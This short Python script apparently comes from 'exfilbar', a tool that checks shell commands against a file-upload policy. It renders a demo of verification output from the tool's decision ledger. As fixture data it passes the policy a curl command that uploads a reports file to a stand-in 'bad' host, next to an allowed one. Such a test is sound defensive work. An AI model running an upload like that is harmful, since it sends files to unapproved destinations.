"""Reproduce the README verification output with isolated fixture decisions."""
from pathlib import Path
import sys
from tempfile import TemporaryDirectory

sys.dont_write_bytecode = True
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from exfilbar.integrity import format_verification
from exfilbar.ledger import Ledger
from exfilbar.policy import Policy


def render():
    policy = Policy(routes=[dict(paths=['reports/**'], to=['https://good/up'])])
    with TemporaryDirectory(prefix='exfilbar-verify-demo-') as directory:
        ledger = Ledger(directory)
        for host in ('good', 'bad'):
            policy.evaluate('curl -T reports/x https://' + host + '/up 2>&1')
            ledger.record('fixture', 'terminal', policy.inspection)
        return format_verification(ledger.verify())


if __name__ == '__main__':
    print(render())
